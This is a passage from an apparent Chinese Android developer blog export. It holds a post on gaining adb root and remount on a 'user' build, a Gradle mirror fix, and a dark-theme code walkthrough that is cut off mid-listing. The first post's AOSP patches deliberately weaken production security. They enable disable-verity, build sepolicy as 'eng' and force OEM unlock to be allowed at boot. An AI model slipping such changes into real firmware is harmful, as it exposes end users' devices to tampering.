class="line"></span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb remount</span><br><span class="line">E Skipping /system</span><br><span class="line">E Skipping /vendor</span><br><span class="line">E Skipping /product</span><br><span class="line">W No partitions to remount</span><br><span class="line">/system/bin/remount exited with status 7</span><br><span class="line">remount failed</span><br><span class="line"></span><br><span class="line">C:&gt;adb disable-verity</span><br><span class="line">Device is locked. Please unlock the device first</span><br><span class="line"></span><br><span class="line">C:&gt;adb reboot bootloader</span><br><span class="line"></span><br><span class="line">C:&gt;fastboot flashing unlock</span><br><span class="line">…</span><br><span class="line">(bootloader) Start unlock flow</span><br><span class="line"></span><br><span class="line">OKAY [ 12.394s]</span><br><span class="line">finished. total time: 12.398s</span><br><span class="line"></span><br><span class="line">C:&gt;fastboot reboot</span><br><span class="line">rebooting…</span><br><span class="line"></span><br><span class="line">finished. total time: 0.003s</span><br><span class="line"></span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb disable-verity</span><br><span class="line">Successfully disabled verity</span><br><span class="line">Now reboot your device <span class="keyword">for</span> settings to take effect</span><br><span class="line"></span><br><span class="line">C:&gt;adb reboot</span><br><span class="line"></span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb remount</span><br><span class="line">remount succeeded</span><br></pre></td></tr></table></figure><p>user 版本已成功获取 adb root</p><h4 id="6-修改-adb-root-权限，编译-userdebug-版本进行比对"><a href="#6-修改-adb-root-权限，编译-userdebug-版本进行比对" class="headerlink" title="6.修改 adb root 权限，编译 userdebug 版本进行比对"></a>6.修改 adb root 权限，编译 userdebug 版本进行比对</h4><p>user 和 userdebug 区别在于 remount 时感觉走的地方不太一样，userdebug remount 时打印的日志来自 system\core\fs_mgr\fs_mgr_remount.cpp</p><p>思路为只要让 user 版本下 remount 时打印一样的日志即可</p><p>修改文件清单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">modified:   system/core/adb/Android.bp</span><br><span class="line">modified:   system/core/fs_mgr/Android.bp</span><br><span class="line">modified:   system/sepolicy/Android.mk</span><br><span class="line">modified:   system/sepolicy/definitions.mk</span><br><span class="line">modified:   frameworks/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java</span><br></pre></td></tr></table></figure><p><strong>system/core/adb/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+++ b/alps/system/core/adb/Android.bp</span><br><span class="line">@@ -412,6 +412,8 @@ cc_library &#123;</span><br><span class="line">         <span class="string">&quot;liblog&quot;</span>,</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line">+    required: [ <span class="string">&quot;remount&quot;</span>,],</span><br><span class="line">+</span><br><span class="line">     product_variables: &#123;</span><br><span class="line">         debuggable: &#123;</span><br><span class="line">             required: [</span><br></pre></td></tr></table></figure><p><strong>system/core/fs_mgr/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+++ b/alps/system/core/fs_mgr/Android.bp</span><br><span class="line">@@ -76,7 +76,8 @@ cc_library &#123;</span><br><span class="line">         <span class="string">&quot;libfstab&quot;</span>,</span><br><span class="line">     ],</span><br><span class="line">     cppflags: [</span><br><span class="line">-        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=0&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">     ],</span><br><span class="line">     product_variables: &#123;</span><br><span class="line">         debuggable: &#123;</span><br><span class="line">@@ -133,7 +134,8 @@ cc_binary &#123;</span><br><span class="line">         <span class="string">&quot;fs_mgr_remount.cpp&quot;</span>,</span><br><span class="line">     ],</span><br><span class="line">     cppflags: [</span><br><span class="line">-        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=0&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">     ],</span><br><span class="line">     product_variables: &#123;</span><br><span class="line">         debuggable: &#123;</span><br></pre></td></tr></table></figure><p>user 版本启用 overlayfs 来装载 remount 对应分区<br><strong>system/sepolicy/Android.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+++ b/alps/system/sepolicy/Android.mk</span><br><span class="line">@@ -309,7 +309,7 @@ LOCAL_REQUIRED_MODULES += \</span><br><span class="line"> </span><br><span class="line"> endif</span><br><span class="line"> </span><br><span class="line">-ifneq ($(TARGET_BUILD_VARIANT), user)</span><br><span class="line">+ifneq ($(TARGET_BUILD_VARIANT), eng)</span><br><span class="line"> LOCAL_REQUIRED_MODULES += \</span><br><span class="line">     selinux_denial_metadata \</span><br><span class="line"> </span><br><span class="line">@@ -1104,7 +1104,8 @@ endif</span><br><span class="line"> ifneq ($(filter address,$(SANITIZE_TARGET)),)</span><br><span class="line">   local_fc_files += $(wildcard $(addsuffix /file_contexts_asan, $(PLAT_PRIVATE_POLICY)))</span><br><span class="line"> endif</span><br><span class="line">-ifneq (,$(filter userdebug eng,$(TARGET_BUILD_VARIANT)))</span><br><span class="line">+ifneq (,$(filter user userdebug eng,$(TARGET_BUILD_VARIANT)))</span><br><span class="line">   local_fc_files += $(wildcard $(addsuffix /file_contexts_overlayfs, $(PLAT_PRIVATE_POLICY)))</span><br><span class="line"> endif</span><br><span class="line"> ifeq ($(TARGET_FLATTEN_APEX),<span class="literal">true</span>)</span><br><span class="line">@@ -1166,7 +1167,9 @@ file_contexts.device.tmp :=</span><br><span class="line"> file_contexts.local.tmp :=</span><br><span class="line"> </span><br><span class="line"> <span class="comment">##################################</span></span><br><span class="line">-ifneq ($(TARGET_BUILD_VARIANT), user)</span><br><span class="line">+<span class="comment"># ifneq ($(TARGET_BUILD_VARIANT), user)</span></span><br><span class="line">+ifneq ($(TARGET_BUILD_VARIANT), eng)</span><br><span class="line"> include $(CLEAR_VARS)</span><br><span class="line"> </span><br><span class="line"> LOCAL_MODULE := selinux_denial_metadata</span><br></pre></td></tr></table></figure><p><strong>system/sepolicy/definitions.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+++ b/alps/system/sepolicy/definitions.mk</span><br><span class="line">@@ -1,10 +1,11 @@</span><br><span class="line"> <span class="comment"># Command to turn collection of policy files into a policy.conf file to be</span></span><br><span class="line"> <span class="comment"># processed by checkpolicy</span></span><br><span class="line"> define transform-policy-to-conf</span><br><span class="line"> @<span class="built_in">mkdir</span> -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span><br><span class="line"> $(hide) m4 --fatal-warnings $(PRIVATE_ADDITIONAL_M4DEFS) \</span><br><span class="line">        -D mls_num_sens=$(PRIVATE_MLS_SENS) -D mls_num_cats=$(PRIVATE_MLS_CATS) \</span><br><span class="line">-       -D target_build_variant=$(PRIVATE_TARGET_BUILD_VARIANT) \</span><br><span class="line">+       -D target_build_variant=eng \</span><br><span class="line">        -D target_with_dexpreopt=$(WITH_DEXPREOPT) \</span><br><span class="line">        -D target_arch=$(PRIVATE_TGT_ARCH) \</span><br></pre></td></tr></table></figure><p>默认开启 OEM 解锁选项</p><p><strong>frameworks/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+++ b/alps/frameworks/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java</span><br><span class="line">@@ -995,6 +995,10 @@ public class UsbDeviceManager implements ActivityTaskManagerInternal.ScreenObser</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         protected void <span class="function"><span class="title">finishBoot</span></span>() &#123;</span><br><span class="line">+            android.service.oemlock.OemLockManager mOemLockManager </span><br><span class="line">+            = (android.service.oemlock.OemLockManager) mContext.getSystemService(Context.OEM_LOCK_SERVICE);</span><br><span class="line">+            mOemLockManager.setOemUnlockAllowedByUser(<span class="literal">true</span>);</span><br><span class="line">+</span><br><span class="line">             <span class="keyword">if</span> (mBootCompleted &amp;&amp; mCurrentUsbFunctionsReceived &amp;&amp; mSystemReady) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (mPendingBootBroadcast) &#123;</span><br><span class="line">                     updateUsbStateBroadcastIfNeeded(getAppliedFunctions(mCurrentFunctions));</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb remount</span><br><span class="line">W DM_DEV_STATUS failed <span class="keyword">for</span> scratch: No such device or address</span><br><span class="line">E [liblp]No device named scratch</span><br><span class="line">[liblp]Partition scratch will resize from 0 bytes to 1315950592 bytes</span><br><span class="line">[liblp]Updated logical partition table at slot 0 on device /dev/block/by-name/super</span><br><span class="line">[libfs_mgr]Created logical partition scratch on device /dev/block/dm-3</span><br><span class="line">[libfs_mgr]superblock s_max_mnt_count:65535,/dev/block/dm-3</span><br><span class="line">[libfs_mgr]__mount(<span class="built_in">source</span>=/dev/block/dm-3,target=/mnt/scratch,<span class="built_in">type</span>=ext4)=0: Success</span><br><span class="line">Using overlayfs <span class="keyword">for</span> /system</span><br><span class="line">Using overlayfs <span class="keyword">for</span> /vendor</span><br><span class="line">Using overlayfs <span class="keyword">for</span> /product</span><br><span class="line">[libfs_mgr]__mount(<span class="built_in">source</span>=overlay,target=/system,<span class="built_in">type</span>=overlay,upperdir=/mnt/scratch/overlay/system/upper)=0</span><br><span class="line">[libfs_mgr]__mount(<span class="built_in">source</span>=overlay,target=/vendor,<span class="built_in">type</span>=overlay,upperdir=/mnt/scratch/overlay/vendor/upper)=0</span><br><span class="line">[libfs_mgr]__mount(<span class="built_in">source</span>=overlay,target=/product,<span class="built_in">type</span>=overlay,upperdir=/mnt/scratch/overlay/product/upper)=0</span><br><span class="line">remount succeeded</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> AndroidStudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio错误修复Connect to repo.maven.apache.org:443</title>
      <link href="/2023/10/14/2023-10-14/"/>
      <url>/2023/10/14/2023-10-14/</url>
      
        <content type="html"><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><table><thead><tr><th>名称</th><th>版本</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows10(64位)</td></tr><tr><td>AndroidStudio</td><td>2022.3.1 Patch 2</td></tr></tbody></table><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近更新了AndroidStudio编写程序的时候发现gradle时老是报<strong>read time out</strong>错误提示</p><p><img src="/images/20231014/20231014001.JPG"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>当出现这个警告时，你应该猜到这是一个连接不上的问题(Connect to repo.maven.apache.org:443)，连接错误的原因是因为没有正确上网导致的maven相关的资源拉不下来，没有梯子，就使用国内的开源网址</p><p>因为Apache 的服务器不在国内，可能会因为某个原因导致连接不上<a href="http://repo.maven.apache.org/">http://repo.maven.apache.org</a> refused，所以现在就是要解决连接问题：</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>国内的阿里技术很厉害 为我们提供了国内的镜像,增加仓库源<br>打开文件 <strong>$project/settings.gradle</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pluginManagement &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        gradlePluginPortal()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">    repositoriesMode.<span class="built_in">set</span>(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rootProject.name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line">include <span class="string">&#x27;:app&#x27;</span></span><br></pre></td></tr></table></figure><p>修改如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pluginManagement &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/google&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/gradle-plugin&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/public&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/jcenter&#x27;</span>&#125; //修改</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        gradlePluginPortal()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">    repositoriesMode.<span class="built_in">set</span>(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">    repositories &#123;</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/google&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/gradle-plugin&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/public&#x27;</span>&#125; //修改</span><br><span class="line">        maven&#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/jcenter&#x27;</span>&#125; //修改</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rootProject.name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line">include <span class="string">&#x27;:app&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>修改完成以后，点击”Sync Project whth Gradle File”（就是那个大象图标）重新同步下，稍等一会，取决于你的网速，提示 <strong>BUILD SUCCESSFUL</strong> </p><p><img src="/images/20231014/20231014002.JPG"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> AndroidStudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13 深色主题切换流程解析</title>
      <link href="/2023/09/24/2023-09-25/"/>
      <url>/2023/09/24/2023-09-25/</url>
      
        <content type="html"><![CDATA[<p>学习笔记：Android小白，这位置网上没资料，通过自己打日志阅读代码走的流程，可能有理解错误的地方。欢迎指正，大家共同进步。</p><p>深色主题设置方法：两种设置方法流程是一样的。</p><ul><li>通过下拉状态栏的快捷按钮深色主题切换；</li><li>通过 设置→显示→深色主题开关 切换；</li></ul><p>本文以下拉状态栏的快捷按钮深色主题切换为例；<br>该快捷按钮类为 <strong>UiModeNightTile.java</strong>，直接看点击事件：</p><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/qs/tiles/UiModeNightTile.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleClick</span><span class="params">(<span class="meta">@Nullable</span> View view)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getState().state == Tile.STATE_UNAVAILABLE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">newState</span> <span class="operator">=</span> !mState.value;</span><br><span class="line">    <span class="comment">// 设置主题模式</span></span><br><span class="line">    mUiModeManager.setNightModeActivated(newState);</span><br><span class="line">    <span class="comment">// 更新该开关的状态</span></span><br><span class="line">    refreshState(newState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面的我们直接找 UiModeManager.java 的 setNightModeActivated() 方法：<br>UiModeManager#setNightModeActivated()<br><strong>frameworks/base/core/java/android/app/UiModeManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermission(android.Manifest.permission.MODIFY_DAY_NIGHT_MODE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">setNightModeActivated</span><span class="params">(<span class="type">boolean</span> active)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// mService 为 UiModeManagerService 的对象</span></span><br><span class="line">            <span class="keyword">return</span> mService.setNightModeActivated(active);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UiModeManagerService#setNightModeActivated()<br><strong>frameworks/base/services/core/java/com/android/server/UiModeManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">setNightModeActivated</span><span class="params">(<span class="type">boolean</span> active)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setNightModeActivatedForModeInternal(mNightModeCustomType, active);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">setNightModeActivatedForModeInternal</span><span class="params">(<span class="type">int</span> modeCustomType, <span class="type">boolean</span> active)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略部分代码......            </span></span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 自动、自定义的主题切换</span></span><br><span class="line">            <span class="keyword">if</span> (mNightMode == MODE_NIGHT_AUTO || mNightMode == MODE_NIGHT_CUSTOM) &#123;</span><br><span class="line">                unregisterScreenOffEventLocked();</span><br><span class="line">                mOverrideNightModeOff = !active;</span><br><span class="line">                mOverrideNightModeOn = active;</span><br><span class="line">                mOverrideNightModeUser = mCurrentUser;</span><br><span class="line">                persistNightModeOverrides(mCurrentUser);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mNightMode == UiModeManager.MODE_NIGHT_NO</span><br><span class="line">                    &amp;&amp; active) &#123;</span><br><span class="line">                <span class="comment">// 夜间模式</span></span><br><span class="line">                mNightMode = UiModeManager.MODE_NIGHT_YES;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mNightMode == UiModeManager.MODE_NIGHT_YES</span><br><span class="line">                    &amp;&amp; !active) &#123;</span><br><span class="line">                <span class="comment">// 日间模式</span></span><br><span class="line">                mNightMode = UiModeManager.MODE_NIGHT_NO;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新 Configuration</span></span><br><span class="line">            updateConfigurationLocked();</span><br><span class="line">            <span class="comment">// 应用 Configuration</span></span><br><span class="line">            applyConfigurationExternallyLocked();</span><br><span class="line">            <span class="comment">// 为当前用户 Secure.putIntForUser 配置   </span></span><br><span class="line">            persistNightMode(mCurrentUser);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Binder.restoreCallingIdentity(ident);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上述代码这里主要看下 applyConfigurationExternallyLocked()、persistNightMode() 两个方法；<br>persistNightMode() 方法简单，先看 UiModeManagerService#persistNightMode()<br><strong>frameworks/base/services/core/java/com/android/server/UiModeManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">persistNightMode</span><span class="params">(<span class="type">int</span> user)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不处于汽车模式，才去设置</span></span><br><span class="line">    <span class="keyword">if</span> (mCarModeEnabled || mCar) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 这里主要是将  mNightMode 的值 put 到数据库。</span></span><br><span class="line">    Secure.putIntForUser(getContext().getContentResolver(),</span><br><span class="line">            Secure.UI_NIGHT_MODE, mNightMode, user);</span><br><span class="line">    <span class="comment">// 夜间模式自定义类型</span></span><br><span class="line">    Secure.putLongForUser(getContext().getContentResolver(),</span><br><span class="line">            Secure.UI_NIGHT_MODE_CUSTOM_TYPE, mNightModeCustomType, user);</span><br><span class="line">    <span class="comment">// 定义自动夜间模式启动毫秒数</span></span><br><span class="line">    Secure.putLongForUser(getContext().getContentResolver(),</span><br><span class="line">            Secure.DARK_THEME_CUSTOM_START_TIME,</span><br><span class="line">            mCustomAutoNightModeStartMilliseconds.toNanoOfDay() / <span class="number">1000</span>, user);</span><br><span class="line">    <span class="comment">// 自定义自动夜间模式结束毫秒</span></span><br><span class="line">    Secure.putLongForUser(getContext().getContentResolver(),</span><br><span class="line">            Secure.DARK_THEME_CUSTOM_END_TIME,</span><br><span class="line">            mCustomAutoNightModeEndMilliseconds.toNanoOfDay() / <span class="number">1000</span>, user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再接着看 UiModeManagerService#applyConfigurationExternallyLocked() 方法：<br><strong>frameworks/base/services/core/java/com/android/server/UiModeManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">applyConfigurationExternallyLocked</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mSetUiMode != mConfiguration.uiMode) &#123;</span><br><span class="line">        mSetUiMode = mConfiguration.uiMode;</span><br><span class="line">        <span class="comment">// 清除快照缓存，</span></span><br><span class="line">        mWindowManager.clearSnapshotCache();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这位置很重要，如果把这里注释了 就无法开机了，估计是没用主题了 </span></span><br><span class="line">        ActivityTaskManager.getService().updateConfiguration(mConfiguration);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;Failure communicating with activity manager&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            Slog.e(TAG, <span class="string">&quot;Activity does not have the &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码将调到 ActivityTaskManagerService#updateConfiguration()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 